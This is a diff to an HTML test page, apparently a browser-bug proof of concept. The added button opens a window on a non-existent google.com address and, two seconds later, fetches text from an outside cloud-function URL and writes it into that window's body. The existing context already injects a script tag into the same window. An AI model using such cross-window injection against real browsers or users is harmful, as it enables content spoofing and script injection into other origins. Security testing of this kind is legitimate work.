@@ -19,5 +19,15 @@
   window.b=window.open('https://non-existent.google.com/');
   setTimeout(function(){b.document.head.innerHTML=b.document.head.innerHTML+'<script></script>'},2000)
   ">Button2</button>
+<button onclick="
+  window.b=window.open('https://non-existent.google.com/');
+  setTimeout(function(){
+    fetch('https://us-central1-cellular-betrayal.cloudfunctions.net/helloWorld')
+    .then(r=>r.text())
+    .then(t=>b.document.body.innerHTML=t)
+  },2000)
+  ">
+  unoriginal
+</button>
 </body>
 </html>
